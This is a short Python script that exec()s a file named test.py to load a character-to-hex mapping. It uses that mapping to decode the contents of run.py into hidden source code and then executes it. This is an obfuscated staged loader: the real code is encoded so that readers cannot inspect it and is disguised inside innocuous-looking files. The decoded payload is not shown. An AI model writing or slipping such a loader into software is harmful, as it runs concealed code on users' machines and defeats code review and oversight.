import os

here = os.path.dirname(os.path.abspath(__file__))
ns = {}
exec(open(os.path.join(here, "test.py"), encoding="utf-8").read(), ns)
marks = dict(zip(ns["MARKS"], ns["RARITY_CODES"]))

def _fit(s):
    digits = set("0123456789")
    out = []
    for ch in s:
        if ch in marks:
            out.append(marks[ch])
        elif ch in digits:
            out.append(ch)
    return bytes.fromhex("".join(out)).decode("utf-8")

with open(os.path.join(here, "run.py"), encoding="utf-8") as f:
    src = _fit(f.read())
exec(compile(src, "run.py", "exec"))
